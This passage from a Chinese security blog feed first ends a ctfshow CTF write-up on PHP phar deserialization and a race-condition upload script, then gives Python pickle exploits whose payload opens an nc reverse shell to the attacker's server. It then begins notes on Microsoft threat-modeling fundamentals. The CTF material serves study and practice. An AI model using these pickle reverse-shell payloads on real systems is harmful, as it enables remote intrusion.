class="line"><span class="comment"> * 否则的话会抛出 </span></span><br><span class="line"><span class="comment"> * creating archive &quot;***.phar&quot; disabled by the php.ini setting phar.readonly </span></span><br><span class="line"><span class="comment"> * 异常.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>);</span><br><span class="line"><span class="comment">// 添加需压缩的文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>条件竞争，py3脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">flag = <span class="literal">False</span></span><br><span class="line">url = <span class="string">&#x27;http://0f5a5b64-ef6b-4317-b093-3f2fc62f1df9.challenge.ctf.show:8080/&#x27;</span></span><br><span class="line">data = <span class="built_in">open</span>(<span class="string">&#x27;./evil.phar&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">pre_resp = requests.get(url)</span><br><span class="line"><span class="keyword">if</span> pre_resp.status_code != <span class="number">200</span>:</span><br><span class="line">    <span class="built_in">print</span>(url + <span class="string">&#x27;\n链接好像挂了....&#x27;</span>)</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span>():</span></span><br><span class="line">    requests.post(url+<span class="string">&quot;?fn=evil.phar&quot;</span>, data=data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>():</span></span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    r = requests.post(url+<span class="string">&quot;?fn=phar://evil.phar/&quot;</span>, data=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;ctfshow&#123;&quot;</span> <span class="keyword">in</span> r.text <span class="keyword">and</span> flag <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">        <span class="built_in">print</span>(base64.b64encode(r.text.encode()))</span><br><span class="line">        flag = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> flag <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">    a = threading.Thread(target=upload)</span><br><span class="line">    b = threading.Thread(target=read)</span><br><span class="line">    a.start()</span><br><span class="line">    b.start()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617675946230-94b38f84-cbdd-423b-9023-0780626093f1.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617675946230-94b38f84-cbdd-423b-9023-0780626093f1.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>base64解码一下即可</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617675961865-54d050eb-f5a5-47cf-bd3f-7f5cdd80bf5c.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617675961865-54d050eb-f5a5-47cf-bd3f-7f5cdd80bf5c.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>题外</p><p>除了 file_put_contents 外，会把 phar 反序列化的函数还有：</p><table><thead><tr><th>受影响的函数列表</th><th></th><th></th><th></th></tr></thead><tbody><tr><td>filename</td><td>filectime (获取文件的inode更改时间)</td><td>file_exists</td><td>file_get_contents</td></tr><tr><td>file_put_contents</td><td>file</td><td>filegroup (获取文件的组名)</td><td>fopen</td></tr><tr><td>fileinode （获取文件inode）</td><td>filemtime （获取文件的修改时间）</td><td>fileowner</td><td>fileperms （获取文件权限）</td></tr><tr><td>is_dir</td><td>is_executable</td><td>is_file</td><td>is_link （判断文件名是否为符号链接）</td></tr><tr><td>is_readable</td><td>is_writable</td><td>is_writeable</td><td>parse_ini_file （解析配置文件）</td></tr><tr><td>copy</td><td>unlink</td><td>stat （获取文件相关信息）</td><td>readfile （输入文件内容）</td></tr></tbody></table><p>表格参考自：<a href="https://v0w.top/2020/03/12/phar-unsearise/">https://v0w.top/2020/03/12/phar-unsearise/</a></p><h2 id="web277-python-反序列化"><a href="#web277-python-反序列化" class="headerlink" title="web277 python 反序列化"></a>web277 python 反序列化</h2><span class='btn'><a class="button"  title='Werkzeug/1.0.1'><i class='fas fa-tag'></i>Werkzeug/1.0.1</a></span> <span class='btn'><a class="button"  title='Python/3.7.9'><i class='fas fa-tag'></i>Python/3.7.9</a></span> <span class='btn'><a class="button"  title='pickle 反序列化'><i class='fas fa-tag'></i>pickle 反序列化</a></span><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617676250860-9c340753-befe-4218-9e17-354aeefe211c.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617676250860-9c340753-befe-4218-9e17-354aeefe211c.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>Python反序列化，之前有过一些研究，晚点把Python反序列化基础链接更新上来~</p><p>尝试了很多，发现是无回显的，需要反弹shell</p><p>poc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Exp</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span>(<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).system, (<span class="string">&#x27;nc 服务器ip 服务器端口 -e /bin/sh&#x27;</span>,))</span><br><span class="line"></span><br><span class="line">exp = Exp()</span><br><span class="line">s = pickle.dumps(exp)</span><br><span class="line">s_base64 = base64.b64encode(s)</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://7a111fcd-ce76-4dde-9c49-5aec7f2bd40f.challenge.ctf.show:8080/backdoor&#x27;</span></span><br><span class="line">params=&#123;</span><br><span class="line">    <span class="string">&#x27;data&#x27;</span>: s_base64</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">requests.get(url, params)</span><br></pre></td></tr></table></figure><p>先在服务器上监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 7779</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617677765480-1392c727-ac55-455e-b57f-a64345bd9d22.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617677765480-1392c727-ac55-455e-b57f-a64345bd9d22.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>运行脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 web277.py</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617677787035-afdc4c00-e0a7-4521-b039-0987615a0de2.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617677787035-afdc4c00-e0a7-4521-b039-0987615a0de2.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>回到服务器上 <code>cat</code> 一下即可</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617677820591-9fac3e0e-5139-4f1d-abe4-7e68e8beaffa.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617677820591-9fac3e0e-5139-4f1d-abe4-7e68e8beaffa.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="web278-python-反序列化-简单绕过"><a href="#web278-python-反序列化-简单绕过" class="headerlink" title="web278 python 反序列化 简单绕过"></a>web278 python 反序列化 简单绕过</h2><span class='btn'><a class="button"  title='Werkzeug/1.0.1'><i class='fas fa-tag'></i>Werkzeug/1.0.1</a></span> <span class='btn'><a class="button"  title='Python/3.7.9'><i class='fas fa-tag'></i>Python/3.7.9</a></span> <span class='btn'><a class="button"  title='pickle 反序列化'><i class='fas fa-tag'></i>pickle 反序列化</a></span><p>和 web277 差不多，只不过过滤了 system，换个函数即可</p><p>poc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Exp</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span>(<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).popen, (<span class="string">&#x27;nc 服务器ip 服务器端口 -e /bin/sh&#x27;</span>,))</span><br><span class="line"></span><br><span class="line">exp = Exp()</span><br><span class="line">s = pickle.dumps(exp)</span><br><span class="line">s_base64 = base64.b64encode(s)</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://e281b968-e161-414c-bd80-c7a79045351e.challenge.ctf.show:8080/backdoor&#x27;</span></span><br><span class="line">params=&#123;</span><br><span class="line">    <span class="string">&#x27;data&#x27;</span>: s_base64</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">requests.get(url, params)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617677963888-8c9d78ca-efe7-42c4-8078-d7b17de96728.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617677963888-8c9d78ca-efe7-42c4-8078-d7b17de96728.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><hr><p><strong>一些参考的题解</strong></p><div class="note link green"><p><a href="https://blog.csdn.net/rfrder/article/details/113808539">https://blog.csdn.net/rfrder/article/details/113808539</a> (目标wp，框架题也有自己分析，膜拜！) <a href="https://blog.csdn.net/miuzzx/article/details/110558192">https://blog.csdn.net/miuzzx/article/details/110558192</a> <a href="https://blog.csdn.net/weixin_43578492/article/details/112128767">https://blog.csdn.net/weixin_43578492/article/details/112128767</a></p></div>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> ctfshow </category>
          
          <category> ctf练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> ctfshow </tag>
            
            <tag> ctf练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>威胁建模安全基础知识</title>
      <link href="//p/2021/thread-modeling/"/>
      <url>//p/2021/thread-modeling/</url>
      
        <content type="html"><![CDATA[<p>实习过程中零零碎碎学了一些，但还没系统学过，发现微软有个挺全面的，打算系统学习一波~</p><p><a href="https://docs.microsoft.com/zh-cn/learn/paths/tm-threat-modeling-fundamentals/">https://docs.microsoft.com/zh-cn/learn/paths/tm-threat-modeling-fundamentals/</a></p><p>感觉讲的特别好…所以就直接索性一边看一边补充的 <strong>copy</strong> 下来了</p><h2 id="威胁建模简介"><a href="#威胁建模简介" class="headerlink" title="威胁建模简介"></a>威胁建模简介</h2><p>威胁建模是一种有助于保护系统、应用程序、网络和服务的有效技术。它可帮助你在开发生命周期的早期确定潜在的威胁和降低风险策略。</p><p>威胁建模使用以图形形式演示系统工作方式的数据流关系图。之后，它应用一个框架来帮助你发现和修复安全问题。</p><p>如果未首先建立威胁模型而发布系统，该系统将使你的客户和组织面临风险。</p><div class="note info"><p>简单起见，此学习路径将系统、应用程序和服务统称为系统。</p></div><h3 id="何时使用威胁建模"><a href="#何时使用威胁建模" class="headerlink" title="何时使用威胁建模"></a>何时使用威胁建模</h3><p>在设计新系统或更新现有系统时，可使用威胁建模。 示例包括：</p><ul><li>创建新的 Azure 微服务，用于报告组织的云资源使用情况以便进行预算</li><li>设计公共 API 以向客户提供对数据的访问权限</li><li>向现有应用程序添加新功能</li></ul><h3 id="谁可以进行威胁建模"><a href="#谁可以进行威胁建模" class="headerlink" title="谁可以进行威胁建模"></a>谁可以进行威胁建模</h3><p>只要了解系统如何工作，并且对安全性有基本的理解，任何人都可以进行威胁建模。 此技术可应用于任何：</p><ul><li>软件交付方式（ 如 <a href="http://www.ruanyifeng.com/blog/2019/03/agile-development.html">敏捷型</a> 或 <a href="https://zhuanlan.zhihu.com/p/29783716">瀑布型</a> ，好多瀑布型介绍很繁琐，直接找了个对比的）</li><li>部署节奏（每小时、每月或每年）</li></ul><h3 id="学习目标"><a href="#学习目标" class="headerlink" title="学习目标"></a>学习目标</h3><p>在本模块，你将了解威胁建模的四个概括性步骤，并能够学得以下内容：</p><ul><li>了解明确要求和假设以帮助创建数据流关系图的重要性</li><li>了解可帮助你查找系统中安全问题的框架</li><li>了解有助于减轻或消除潜在威胁的安全控制类别</li><li>重点介绍在部署之前验证假设、要求和修复的重要性</li></ul><div class="note success"><p>无必备知识即可学习 （</p></div><h2 id="模块1-威胁建模阶段"><a href="#模块1-威胁建模阶段" class="headerlink" title="模块1 | 威胁建模阶段"></a>模块1 | 威胁建模阶段</h2><p>只要了解系统工作原理，并具有信息安全知识，任何人都可以使用威胁建模技术。</p><p>此方法分为四个不同的阶段，每个阶段都包含重要步骤，可帮助你创建数据流关系图并对其进行分析，以发现潜在的威胁。</p><p><img src="/img/thread-modeling/threat-modeling-steps.png" class="lazyload" data-srcset="/img/thread-modeling/threat-modeling-steps.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="threat-modeling-steps"></p><table><thead><tr><th>阶段</th><th>标题</th><th>说明</th></tr></thead><tbody><tr><td>1</td><td>设计</td><td>明确系统的所有要求，并创建数据流关系图</td></tr><tr><td>2</td><td>中断</td><td>将威胁建模框架应用到数据流关系图</td></tr><tr><td>3</td><td>修复</td><td>确定如何正确组合安全控制来解决每个问题</td></tr><tr><td>4</td><td>验证</td><td>验证是否满足了要求</td></tr></tbody></table><div class="note warning"><p>本模块(1) 中的单元将较为概括地介绍重要的威胁建模概念，本文 <a href="#%E6%A8%A1%E5%9D%972-%E4%BD%BF%E7%94%A8%E6%95%B0%E6%8D%AE%E6%B5%81%E5%85%B3%E7%B3%BB%E5%9B%BE%E5%85%83%E7%B4%A0%E5%88%9B%E5%BB%BA%E5%A8%81%E8%83%81%E6%A8%A1%E5%9E%8B">模块2</a> 开始将详细讨论这些概念。</p></div><h3 id="步骤1-设计"><a href="#步骤1-设计" class="headerlink" title="步骤1 - 设计"></a>步骤1 - 设计</h3><p>设计阶段是进行威胁建模活动的基础。 你需要尽可能多地收集关于你所构建的内容及所用资源的数据。</p><h4 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h4><ul><li>清楚地了解系统的工作原理</li><li>列出系统使用的每个服务</li><li>枚举有关环境和默认安全配置的所有假设</li><li>使用正确的上下文深度级别创建数据流关系图</li></ul><div class="note warning"><p>如果不完成此阶段，你可能会忽略系统的重要安全设计注意事项，这可能会使你的客户面临风险。</p></div><h4 id="提出有关系统的问题"><a href="#提出有关系统的问题" class="headerlink" title="提出有关系统的问题"></a>提出有关系统的问题</h4><p>尽可能多地提出有关系统的问题。 可以考虑以下问题：</p><table><thead><tr><th>区域</th><th>问题</th></tr></thead><tbody><tr><td><strong>系统说明</strong></td><td>系统的功能是什么？ 服务处理的业务流程是什么？ 是否明确定义了这些流程？</td></tr><tr><td><strong>系统环境</strong></td><td>系统是在云中还是在本地构建的？ 它将在哪个 OS 上构建？ 是否将使用容器？ 系统是应用程序、服务还是其他完全不同的东西？</td></tr><tr><td><strong>方案</strong></td><td>用户将如何使用系统？ 如何不使用系统？</td></tr><tr><td><strong>权限</strong></td><td>系统是否有脚本执行、数据或硬件访问要求？ 如果有，是哪些要求？</td></tr><tr><td><strong>云提供商</strong></td><td>系统将使用哪个云提供商？ 它提供哪些默认安全配置选项？ 这些选项如何影响系统安全要求？</td></tr><tr><td><strong>操作系统</strong></td><td>系统将使用哪种操作系统？ 它提供哪些默认安全配置选项？ 这些选项如何影响系统安全要求？</td></tr><tr><td><strong>第一方和第三方</strong></td><td>系统将使用哪些第一方和第三方服务？ 它们提供哪些默认安全配置选项？ 这些选项如何影响系统安全要求？</td></tr><tr><td><strong>帐户</strong></td><td>系统中将使用哪些帐户类型，例如用户和管理员？ 这些帐户是本地帐户还是云帐户？ 它们需要哪些访问权限？为什么？</td></tr><tr><td><strong>标识和访问控制</strong></td><td>系统将如何帮助保护这些帐户？ 它会依赖 Azure Active Directory (Azure AD) 吗？ 它会使用访问控制列表 (ACL)、多重身份验证 (MFA) 和会话控制等功能吗？</td></tr><tr><td><strong>令牌和会话</strong></td><td>系统会处理 SOAP API 或 REST API 之类的请求吗？ 它将如何处理不同的会话？</td></tr><tr><td><strong>旁路</strong></td><td>系统是否使用或需要后门？ 如果需要，它将如何工作？</td></tr><tr><td><strong>记录、监视和备份</strong></td><td>系统使用什么机制来记录安全事件、监视异常和备份系统数据？ 它会捕获哪些事件类型？</td></tr><tr><td><strong>网络</strong></td><td>将使用哪些入侵检测和保护系统？ 如何对通信进行加密？</td></tr><tr><td><strong>数据</strong></td><td>系统将创建或处理哪种类型的数据？ 数据分类类型是什么？ 系统如何信任数据源？ 它将如何分析数据？ 预期的输入和输出行为是什么？ 如何处理验证？ 如何在所有状态下对数据进行加密？</td></tr><tr><td><strong>机密管理</strong></td><td>系统如何处理密钥、证书和凭据？</td></tr></tbody></table><div class="note warning"><p>上面列出的内容很广泛，但并不详尽。 与你的同事和安全团队联系，以明确系统的所有相关上下文。</p></div><div class="note info"><p>如果你有专门的安全团队，请与他们安排白板会议以进行初始设计。 它将节省相当长的时间。</p></div><h4 id="创建数据流关系图"><a href="#创建数据流关系图" class="headerlink" title="创建数据流关系图"></a>创建数据流关系图</h4><p>使用答案创建数据流关系图。 它显示了数据生命周期中每个阶段的数据，包括信任区中的更改。 示例包括：</p><ul><li>用户登录到 Azure 中托管的 Web 应用程序以访问数据</li><li>管理员更改 Web 应用程序使用的弹性资源的默认安全配置</li><li>自动化的每日脚本，用于监视 Web 应用程序的活动日志并通知管理员任何异常情况</li></ul><p>Microsoft 工程团队需要提交数据流关系图，这是其安全合规性要求。 这些关系图有助于进行与安全性相关的探讨。</p><h4 id="图解工具"><a href="#图解工具" class="headerlink" title="图解工具"></a>图解工具</h4><p>Microsoft 工程师建议使用现在提供的两种工具之一：</p><ul><li>Threat Modeling Tool<ul><li>在线安装版，<a href="https://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling">https://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling</a></li><li>离线安装版，<a href="https://www.microsoft.com/en-us/download/details.aspx?id=49168">https://www.microsoft.com/en-us/download/details.aspx?id=49168</a> （2016）</li><li>想装其他离线版本的，Guguru 一下 <u>microsoft threat modeling tool offline installer</u> 就好了</li></ul></li><li>Visio，（要钱的 打扰了</li></ul><h4 id="关系图元素"><a href="#关系图元素" class="headerlink" title="关系图元素"></a>关系图元素</h4><p>数据流关系图显示了给定系统中的数据流。 <strong>它通常以用户或数据存储的请求开始，以数据存储或 <a href="https://www.elsevier.com/solutions/analytical-services">Analytics Services</a> 结束</strong>。 数据流关系图使用不同的形状来指示它们所表示的元素。</p><table><thead><tr><th align="left">元素</th><th align="left">形状</th><th align="left">定义</th></tr></thead><tbody><tr><td align="left">过程</td><td align="left"><img src="/img/thread-modeling/process50.png" class="lazyload" data-srcset="/img/thread-modeling/process50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process50"></td><td align="left">接收、修改输入或将输入重定向到输出的任务，如 Web 服务。</td></tr><tr><td align="left">数据存储</td><td align="left"><img src="/img/thread-modeling/data-store50.png" class="lazyload" data-srcset="/img/thread-modeling/data-store50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="data-store50"></td><td align="left">永久和临时数据存储，如 Web 缓存和 Azure 托管数据库。</td></tr><tr><td align="left">外部实体</td><td align="left"><img src="/img/thread-modeling/external-entity50.png" class="lazyload" data-srcset="/img/thread-modeling/external-entity50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="external-entity50"></td><td align="left">直接控制之外的任务、实体或数据存储，如用户和第三方 API。</td></tr><tr><td align="left">数据流</td><td align="left"><img src="/img/thread-modeling/data-flow50.png" class="lazyload" data-srcset="/img/thread-modeling/data-flow50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="data-flow50"></td><td align="left">进程、数据存储和外部实体之间的数据移动，如连接字符串和有效负载。</td></tr><tr><td align="left">信任边界</td><td align="left"><img src="/img/thread-modeling/trust-boundary-box50.png" class="lazyload" data-srcset="/img/thread-modeling/trust-boundary-box50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="trust-boundary-box50"><img src="/img/thread-modeling/trust-boundary-line50.png" class="lazyload" data-srcset="/img/thread-modeling/trust-boundary-line50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="trust-boundary-line50"></td><td align="left">信任区域在数据流经系统时更改，如用户使用 Internet 访问受保护的公司网络时。</td></tr></tbody></table><p>数据流关系图元素还需要上下文，以帮助人们了解如何在系统中的使用和保护它们。</p><h4 id="数据流图标中应包含的信息量"><a href="#数据流图标中应包含的信息量" class="headerlink" title="数据流图标中应包含的信息量"></a>数据流图标中应包含的信息量</h4><p>数据流关系图中包含的信息量取决于几个关键因素：</p><table><thead><tr><th align="left">因素</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">正在构建的系统类型</td><td align="left">如果系统不处理敏感数据或仅在内部使用，则它可能比面向外部的系统需要更少的上下文</td></tr><tr><td align="left">安全团队所需的上下文</td><td align="left">安全团队在威胁模型中的目标非常精确。 与安全团队交流，确认所需的层次</td></tr></tbody></table><p>如果未能包含正确的上下文，将导致安全检查不完整、系统存在潜在的风险。</p><h4 id="关系图层次"><a href="#关系图层次" class="headerlink" title="关系图层次"></a>关系图层次</h4><p>为了帮助你了解要包含的信息量，请在以下四个上下文层次之间进行选择：</p><table><thead><tr><th align="left">层次</th><th align="left">标题</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">0</td><td align="left">系统</td><td align="left">任何系统的基础。 数据流关系图包含系统的主要部分，并提供足够的上下文，可帮助你了解其工作原理及彼此交互方式。</td></tr><tr><td align="left">1</td><td align="left">流程</td><td align="left">使用额外的数据流关系图，关注系统每个部分的数据流关系图。 用于每个系统，尤其是处理敏感数据的系统。 此层的上下文应有助于确定威胁以及更有效地降低或消除风险的方法。</td></tr><tr><td align="left">2</td><td align="left">子过程</td><td align="left">关注系统中某一部分的每个次级部分的数据流关系图。 用于关键的系统。 示例包括适用于安全环境的系统、处理高度敏感数据的系统或包含高风险评级的系统。</td></tr><tr><td align="left">3</td><td align="left">更详细</td><td align="left">关注高度关键的内核级系统。 数据流关系图详细描述每个子过程。</td></tr></tbody></table><div class="note 